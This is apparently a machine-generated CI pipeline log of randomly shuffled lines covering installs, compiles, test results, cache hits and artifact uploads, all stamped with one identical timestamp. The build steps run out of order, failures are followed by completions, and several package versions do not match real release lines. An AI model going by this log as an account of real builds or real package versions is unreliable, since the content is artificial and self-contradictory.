key-9164\n[12:00:25] INFO: Processing request\nStep 10/10: Building\nCache hit for key-6320\nCache hit for key-4648\nCache hit for key-8507\n[12:00:25] INFO: Processing request\nCompiling src/main.py...\nInstalling lodash@5.0.0\n  PASS: test_db_connect (5ms)\n[12:00:25] INFO: Processing request\nCache hit for key-8855\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (35MB)\nInstalling axios@4.4.0\n\u2713 test completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nInstalling lodash@2.11.0\nWARNING: axios has known vulnerabilities\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCache hit for key-4622\nCompiling src/index.js...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nInstalling react@5.14.0\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\nStep 7/10: Building\n  PASS: test_user_create (331ms)\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:25] INFO: Processing request\nInstalling react@2.6.0\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_db_connect (396ms)\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-7875\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_cache_hit (485ms)\n\u2713 lint completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/handler.rs...\n  PASS: test_api_health (298ms)\nInstalling react@4.12.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:25] INFO: Processing request\nStep 7/10: Building\nInstalling axios@1.5.0\n\u2713 test completed\nStep 4/10: Building\nInstalling webpack@3.11.0\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-9364\nInstalling jest@2.9.0\nCompiling src/index.js...\nCompiling src/service.java...\n[12:00:25] INFO: Processing request\n=== Step install_dependencies completed ===\n=== Step: build ===\nException: RuntimeError\nCache hit for key-9310\nCache hit for key-4091\n  PASS: test_user_create (499ms)\n[12:00:25] INFO: Processing request\nCache hit for key-8543\n  PASS: test_cache_hit (324ms)\nCache hit for key-7827\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-1926\nInstalling prettier@5.14.0\nCompiling src/main.py...\n\u2713 build completed\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-9526\nStep 7/10: Building\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling axios@4.11.0\n  PASS: test_auth_login (178ms)\nStep 6/10: Building\nCompiling src/app.ts...\nInstalling react@5.16.0\n  PASS: test_cache_hit (392ms)\nWARNING: prettier has known vulnerabilities\nInstalling webpack@1.16.0\nCache hit for key-6666\nInstalling jest@3.5.0\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nInstalling lodash@4.8.0\n\u2713 test completed\nStep 1/10: Building\n  PASS: test_auth_login (372ms)\nStep 1/10: Building\nCache hit for key-8352\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:25] INFO: Processing request\nStep 3/10: Building\nInstalling express@4.19.0\nInstalling eslint@4.15.0\n  PASS: test_db_connect (166ms)\nInstalling eslint@3.16.0\nArtifact uploaded: build.tar.gz (7MB)\nStep 7/10: Building\n  PASS: test_db_connect (411ms)\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\nWARNING: express has known vulnerabilities\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-9724\n[12:00:25] INFO: Processing request\nCache hit for key-7366\nCompiling src/main.py...\n\u2713 build completed\n  PASS: test_db_connect (426ms)\n\u2713 build completed\nInstalling prettier@1.6.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (3MB)\nInstalling prettier@4.1.0\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nInstalling jest@2.20.0\nCache hit for key-8054\nFAILED: test_cache_hit\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (48MB)\nStep 6/10: Building\nCompiling src/app.ts...\n\u2713 test completed\nCache hit for key-1513\n  PASS: test_api_health (375ms)\nCache hit for key-7893\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (20MB)\nInstalling react@3.8.0\nInstalling eslint@1.17.0\nCache hit for key-3180\n\u2713 test completed\nStep 10/10: Building\nInstalling prettier@1.4.0\n[12:00:25] INFO: Processing request\nStep 1/10: Building\n\u2713 build completed\nStep 7/10: Building\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_db_connect (50ms)\nCompiling src/service.java...\n  PASS: test_api_health (13ms)\n[12:00:25] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-1764\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-1691\n  PASS: test_api_health (384ms)\nStep 6/10: Building\nStep 8/10: Building\nException: NullPointerException\nCompiling src/utils.go...\n\u2713 build completed\n  PASS: test_db_connect (73ms)\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (19MB)\nStep 10/10: Building\n\u2713 lint completed\nStep 2/10: Building\nStep 5/10: Building\nCompiling src/index.js...\nCompiling src/handler.rs...\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\nInstalling webpack@3.4.0\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-4819\nCompiling src/app.ts...\nStep 10/10: Building\nCache hit for key-5467\nCompiling src/main.py...\nStep 5/10: Building\nCache hit for key-2837\nInstalling lodash@2.0.0\nStep 7/10: Building\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nInstalling webpack@4.4.0\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nInstalling axios@1.1.0\nStep 3/10: Building\nInstalling jest@3.16.0\nStep 9/10: Building\nCompiling src/index.js...\nInstalling eslint@1.14.0\n[12:00:25] WARN: Deprecated API usage\nStep 2/10: Building\nCompiling src/app.ts...\nStep 4/10: Building\nCompiling src/index.js...\n\u2717 build failed with exit code 91\nCompiling src/main.py...\nStep 9/10: Building\n  PASS: test_api_health (58ms)\nCache hit for key-5440\n\u2713 lint completed\n  PASS: test_auth_login (453ms)\nInstalling webpack@2.19.0\n\u2713 build completed\nInstalling axios@4.14.0\nCompiling src/service.java...\n[12:00:25] INFO: Processing request\nInstalling webpack@5.19.0\nInstalling axios@4.9.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] ERROR: Connection failed\n\u2713 lint completed\nException: RuntimeError\nInstalling eslint@5.10.0\n\u2713 lint completed\nInstalling react@2.10.0\nStep 4/10: Building\n\u2717 build failed with exit code 107\n[12:00:25] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCache hit for key-1714\n  PASS: test_api_health (494ms)\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:25] INFO: Processing request\n  PASS: test_auth_login (325ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nInstalling webpack@5.6.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nStep 6/10: Building\nInstalling express@2.1.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/index.js...\n=== Step build completed ===\n=== Step: setup_environment ===\nCache hit for key-3444\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (426ms)\nStep 6/10: Building\n  PASS: test_db_connect (269ms)\nInstalling jest@5.11.0\n\u2713 test completed\nCache hit for key-1883\n\u2713 lint completed\nCache hit for key-8487\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (29MB)\nInstalling eslint@5.13.0\n\u2713 test completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/app.ts...\nInstalling express@5.13.0\n\u2713 test completed\n[12:00:25] INFO: Processing request\nInstalling prettier@3.13.0\nStep 9/10: Building\n  PASS: test_cache_hit (92ms)\nInstalling react@5.17.0\nCache hit for key-4291\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (13MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nStep 2/10: Building\nInstalling lodash@4.5.0\n  PASS: test_user_create (498ms)\nCompiling src/app.ts...\n  PASS: test_user_create (189ms)\nCache hit for key-7996\nStep 3/10: Building\n\u2713 lint completed\n  PASS: test_cache_hit (307ms)\nStep 9/10: Building\n\u2717 build failed with exit code 24\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_cache_hit (403ms)\n  PASS: test_auth_login (71ms)\n  PASS: test_db_connect (5ms)\nCache hit for key-5897\n  PASS: test_auth_login (293ms)\nFAILED: test_api_health\n[12:00:25] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nFAILED: test_db_connect\nInstalling jest@4.10.0\nStep 1/10: Building\n  PASS: test_cache_hit (335ms)\nStep 1/10: Building\nCompiling src/service.java...\nCompiling src/service.java...\nCache hit for key-2867\nInstalling webpack@1.11.0\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-2126\n\u2717 build failed with exit code 59\nCache hit for key-9998\nException: TypeError\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\nStep 4/10: Building\n\u2713 lint completed\nInstalling webpack@1.5.0\n[12:00:25] WARN: Deprecated API usage\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\nInstalling jest@1.19.0\n\u2713 test completed\nCompiling src/service.java...\nCompiling src/service.java...\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/service.java...\nStep 7/10: Building\nInstalling lodash@3.5.0\nException: NullPointerException\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 test completed\nInstalling jest@2.3.0\n\u2713 lint completed\nCompiling src/main.py...\nInstalling eslint@2.6.0\nCompiling src/index.js...\n  PASS: test_cache_hit (170ms)\n  PASS: test_api_health (65ms)\nInstalling webpack@2.4.0\n  PASS: test_auth_login (319ms)\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:25] INFO: Processing request\nFAILED: test_cache_hit\n\u2713 lint completed\nCache hit for key-4215\n  PASS: test_cache_hit (324ms)\nStep 9/10: Building\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (12MB)\nInstalling axios@5.10.0\n\u2713 lint completed\n\u2717 build failed with exit code 57\nInstalling react@2.7.0\n[12:00:25] ERROR: Connection failed\n  PASS: test_cache_hit (228ms)\nCache hit for key-3726\nStep 7/10: Building\nCompiling src/service.java...\n\u2713 test completed\n  PASS: test_user_create (172ms)\nCache hit for key-3163\nArtifact uploaded: build.tar.gz (34MB)\nStep 4/10: Building\nCache hit for key-1406\n[12:00:25] ERROR: Connection failed\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\n  PASS: test_cache_hit (234ms)\nStep 3/10: Building\nStep 2/10: Building\n  PASS: test_auth_login (18ms)\n\u2713 test completed\nCache hit for key-9067\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (31MB)\n\u2713 test completed\nCache hit for key-7045\nException: TypeError\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_db_connect (342ms)\nArtifact uploaded: build.tar.gz (37MB)\nWARNING: express has known vulnerabilities\nStep 3/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nCache hit for key-8504\nStep 7/10: Building\nWARNING: react has known vulnerabilities\nCache hit for key-1418\n[12:00:25] INFO: Processing request\nCache hit for key-3039\nInstalling webpack@4.10.0\n[12:00:25] INFO: Processing request\nCache hit for key-1692\nException: ValueError\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 test completed\nInstalling react@3.17.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-5437\n[12:00:25] INFO: Processing request\nCache hit for key-3254\n\u2713 lint completed\nCompiling src/service.java...\n  PASS: test_cache_hit (349ms)\nCache hit for key-1698\nCache hit for key-9812\n  PASS: test_auth_login (270ms)\nArtifact uploaded: build.tar.gz (40MB)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:25] WARN: Deprecated API usage\nInstalling express@2.12.0\nInstalling lodash@2.5.0\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:25] INFO: Processing request\nInstalling express@2.12.0\nInstalling react@1.14.0\nStep 2/10: Building\nCache hit for key-2746\nCache hit for key-1199\n  PASS: test_user_create (282ms)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCompiling src/main.py...\nInstalling jest@3.4.0\nCompiling src/service.java...\nStep 3/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/index.js...\nCompiling src/utils.go...\nFAILED: test_auth_login\nCompiling src/service.java...\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nInstalling webpack@2.7.0\nInstalling prettier@5.5.0\nCompiling src/index.js...\nStep 5/10: Building\n[12:00:25] INFO: Processing request\nStep 4/10: Building\nInstalling express@4.9.0\nStep 10/10: Building\n\u2713 test completed\nCompiling src/utils.go...\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nCache hit for key-3679\nCompiling src/main.py...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (20MB)\nWARNING: jest has known vulnerabilities\n\u2713 test completed\nStep 8/10: Building\nStep 6/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:25] ERROR: Connection failed\nCompiling src/app.ts...\n\u2717 build failed with exit code 10\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/utils.go...\nInstalling react@4.17.0\n\u2713 lint completed\n  PASS: test_db_connect (448ms)\n[12:00:25] INFO: Processing request\n\u2713 test completed\nInstalling prettier@5.9.0\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 lint completed\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\nInstalling axios@4.2.0\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:25] INFO: Processing request\nStep 9/10: Building\nInstalling react@4.0.0\n  PASS: test_auth_login (219ms)\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 build completed\nCache hit for key-2350\n\u2713 test completed\n  PASS: test_cache_hit (311ms)\nInstalling jest@5.9.0\nCompiling src/service.java...\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-7590\nStep 8/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-2452\nArtifact uploaded: build.tar.gz (35MB)\nException: ValueError\nCache hit for key-8688\n  PASS: test_api_health (464ms)\nCache hit for key-9820\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-4585\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:25] WARN: Deprecated API usage\nStep 6/10: Building\n[12:00:25] INFO: Processing request\nInstalling lodash@4.10.0\n\u2713 test completed\nStep 9/10: Building\n  PASS: test_auth_login (291ms)\nCache hit for key-4342\nCache hit for key-1741\nStep 3/10: Building\n  PASS: test_api_health (236ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_user_create (204ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (382ms)\n  PASS: test_auth_login (332ms)\nWARNING: express has known vulnerabilities\nStep 9/10: Building\nCompiling src/index.js...\n\u2713 build completed\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/index.js...\n[12:00:25] INFO: Processing request\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (155ms)\nStep 8/10: Building\nStep 4/10: Building\nStep 1/10: Building\nCache hit for key-4727\n\u2713 lint completed\n  PASS: test_user_create (410ms)\nCompiling src/index.js...\nCompiling src/index.js...\nCompiling src/index.js...\nInstalling axios@3.17.0\nStep 7/10: Building\n[12:00:25] INFO: Processing request\nWARNING: jest has known vulnerabilities\nInstalling webpack@4.15.0\n\u2713 test completed\nCache hit for key-5470\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-5227\nCompiling src/index.js...\nInstalling webpack@5.2.0\nInstalling webpack@1.3.0\nCache hit for key-5430\nInstalling lodash@5.6.0\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:25] ERROR: Connection failed\nStep 10/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-8193\n\u2713 lint completed\nStep 5/10: Building\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (160ms)\nArtifact uploaded: build.tar.gz (7MB)\n\u2717 build failed with exit code 57\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nCache hit for key-8087\nStep 4/10: Building\nStep 1/10: Building\n  PASS: test_db_connect (22ms)\n[12:00:25] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 test completed\n  PASS: test_api_health (421ms)\n\u2713 build completed\nCompiling src/handler.rs...\nStep 4/10: Building\nCompiling src/index.js...\nInstalling react@1.5.0\nCompiling src/main.py...\nInstalling webpack@2.0.0\nStep 4/10: Building\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nStep 3/10: Building\nCompiling src/main.py...\nStep 10/10: Building\nInstalling eslint@4.17.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (475ms)\nInstalling webpack@4.17.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 2/10: Building\n[12:00:25] INFO: Processing request\nInstalling axios@4.12.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-4394\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:25] INFO: Processing request\nCompiling src/main.py...\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (33ms)\n[12:00:25] INFO: Processing request\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling react@1.16.0\n[12:00:25] INFO: Processing request\nStep 5/10: Building\nCompiling src/service.java...\n  PASS: test_db_connect (120ms)\nException: NullPointerException\nCompiling src/index.js...\n[12:00:25] INFO: Processing request\nStep 9/10: Building\n  PASS: test_user_create (330ms)\n\u2713 build completed\n=== Step unit_tests completed ===\n=== Step: lint ===\n  PASS: test_db_connect (76ms)\n\u2713 test completed\n  PASS: test_auth_login (315ms)\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_cache_hit (248ms)\nCompiling src/main.py...\n\u2713 build completed\nCache hit for key-4500\nStep 8/10: Building\nCompiling src/main.py...\n\u2713 build completed\nStep 10/10: Building\n  PASS: test_db_connect (356ms)\nInstalling jest@2.10.0\nCache hit for key-6814\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 build completed\nInstalling eslint@2.0.0\nInstalling lodash@1.7.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-4953\nCompiling src/service.java...\nInstalling prettier@1.6.0\nStep 3/10: Building\nInstalling webpack@4.16.0\nStep 5/10: Building\n  PASS: test_user_create (457ms)\nInstalling lodash@2.5.0\nInstalling react@5.14.0\n  PASS: test_api_health (156ms)\nStep 8/10: Building\n  PASS: test_auth_login (81ms)\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/app.ts...\n\u2713 lint completed\n\u2713 lint completed\nStep 7/10: Building\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (237ms)\nCompiling src/app.ts...\nInstalling eslint@3.11.0\nCache hit for key-7476\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCache hit for key-6295\nCompiling src/handler.rs...\nFAILED: test_cache_hit\nStep 6/10: Building\nCache hit for key-3036\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (225ms)\nInstalling eslint@2.10.0\nInstalling prettier@3.9.0\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_api_health (110ms)\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nStep 7/10: Building\nStep 1/10: Building\nCache hit for key-2228\n  PASS: test_user_create (482ms)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nStep 6/10: Building\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_auth_login (135ms)\nStep 7/10: Building\nCache hit for key-7322\nStep 1/10: Building\n\u2713 build completed\nCompiling src/handler.rs...\n\u2713 build completed\n[12:00:25] ERROR: Connection failed\n  PASS: test_user_create (136ms)\nCache hit for key-9981\n[12:00:25] INFO: Processing request\nInstalling axios@5.3.0\nArtifact uploaded: build.tar.gz (33MB)\nInstalling lodash@3.4.0\n\u2713 build completed\nCache hit for key-4590\nInstalling express@1.16.0\nStep 4/10: Building\nCache hit for key-2980\nInstalling prettier@5.13.0\nInstalling prettier@1.0.0\nCompiling src/main.py...\nStep 9/10: Building\nInstalling eslint@4.3.0\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_api_health (341ms)\n  PASS: test_auth_login (444ms)\nException: NullPointerException\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] ERROR: Connection failed\nStep 8/10: Building\nCache hit for key-7415\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\n[12:00:25] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:25] INFO: Processing request\n\u2713 test completed\nStep 8/10: Building\n  PASS: test_api_health (309ms)\nStep 6/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_api_health (284ms)\nStep 6/10: Building\nStep 10/10: Building\nWARNING: axios has known vulnerabilities\nCompiling src/handler.rs...\nCache hit for key-5838\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:25] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (41MB)\nInstalling axios@4.10.0\nArtifact uploaded: build.tar.gz (7MB)\nInstalling prettier@5.14.0\nStep 9/10: Building\nInstalling prettier@2.12.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (31MB)\nInstalling express@2.16.0\nInstalling webpack@5.4.0\nArtifact uploaded: build.tar.gz (12MB)\nInstalling axios@3.14.0\nInstalling jest@1.14.0\nCache hit for key-5692\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nStep 4/10: Building\n\u2713 lint completed\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/10: Building\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (46MB)\nInstalling axios@1.13.0\nArtifact uploaded: build.tar.gz (10MB)\nStep 1/10: Building\nStep 2/10: Building\n  PASS: test_api_health (259ms)\nCache hit for key-5299\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-1506\n  PASS: test_user_create (418ms)\n  PASS: test_api_health (167ms)\nInstalling eslint@4.0.0\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 test completed\n\u2713 build completed\n\u2717 build failed with exit code 56\nCache hit for key-6077\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nStep 9/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:25] WARN: Deprecated API usage\n\u2713 lint completed\nCompiling src/main.py...\nInstalling express@1.15.0\nInstalling prettier@2.20.0\n  PASS: test_api_health (303ms)\nCache hit for key-5700\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nCompiling src/index.js...\n  PASS: test_cache_hit (23ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_db_connect (379ms)\nStep 6/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-5287\nCache hit for key-5895\n=== Step lint completed ===\n=== Step: integration_tests ===\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_db_connect (472ms)\n  PASS: test_db_connect (297ms)\nCache hit for key-7897\nStep 7/10: Building\nStep 8/10: Building\nCache hit for key-6286\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling jest@1.0.0\nInstalling express@4.1.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-1101\n  PASS: test_api_health (372ms)\nCompiling src/app.ts...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-8008\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-8354\n  PASS: test_user_create (264ms)\n  PASS: test_user_create (11ms)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (200ms)\n  PASS: test_db_connect (75ms)\nInstalling axios@5.0.0\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 1/10: Building\n  PASS: test_cache_hit (401ms)\n\u2713 lint completed\n\u2713 test completed\n\u2713 test completed\n  PASS: test_auth_login (429ms)\nInstalling axios@4.11.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/service.java...\nCache hit for key-7440\nCache hit for key-8427\nCache hit for key-7516\nCache hit for key-7388\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_db_connect (82ms)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/handler.rs...\nCache hit for key-6262\nStep 10/10: Building\n  PASS: test_auth_login (182ms)\nCache hit for key-9772\nCache hit for key-2089\nArtifact uploaded: build.tar.gz (27MB)\nInstalling react@2.19.0\nCompiling src/utils.go...\nCache hit for key-7984\nInstalling webpack@4.5.0\nFAILED: test_db_connect\n  PASS: test_cache_hit (130ms)\n  PASS: test_db_connect (237ms)\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\nStep 8/10: Building\n[12:00:25] INFO: Processing request\n\u2713 test completed\nInstalling express@3.16.0\nStep 3/10: Building\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-5123\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nInstalling eslint@4.15.0\nInstalling express@3.7.0\nWARNING: express has known vulnerabilities\nCache hit for key-9728\n[12:00:25] INFO: Processing request\nStep 10/10: Building\nInstalling webpack@5.18.0\nCompiling src/handler.rs...\nCache hit for key-6646\n  PASS: test_auth_login (23ms)\nCache hit for key-1910\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nCache hit for key-1598\nCache hit for key-5848\nInstalling express@5.1.0\n\u2713 test completed\nInstalling express@4.15.0\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCache hit for key-8699\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-9529\nCompiling src/main.py...\n  PASS: test_cache_hit 